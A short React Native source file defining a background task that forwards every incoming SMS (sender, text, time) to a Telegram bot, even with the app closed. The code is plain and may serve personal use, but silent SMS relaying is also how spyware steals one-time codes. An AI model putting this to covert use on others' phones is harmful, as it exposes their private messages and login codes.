import BotService from '../telegram/BotService';

/**
 * Headless JS Task Handler for processing SMS in background
 * This runs even when the app UI is closed
 * @param {Object} taskData - Data from native code containing SMS details
 */
const SmsTaskHandler = async (taskData) => {
  try {
    console.log('Processing SMS in background:', taskData);

    const { sender, message, timestamp } = taskData;

    // Format message for Telegram
    const formattedMessage = `
📱 *New SMS Received*

👤 From: ${sender}
📝 Message: ${message}
🕒 Time: ${new Date(timestamp).toLocaleString()}
    `.trim();

    // Send to Telegram
    await BotService.sendMessage(formattedMessage);

    console.log('SMS successfully forwarded to Telegram');
  } catch (error) {
    console.error('Error processing SMS in background:', error);
  }
};

export default SmsTaskHandler;
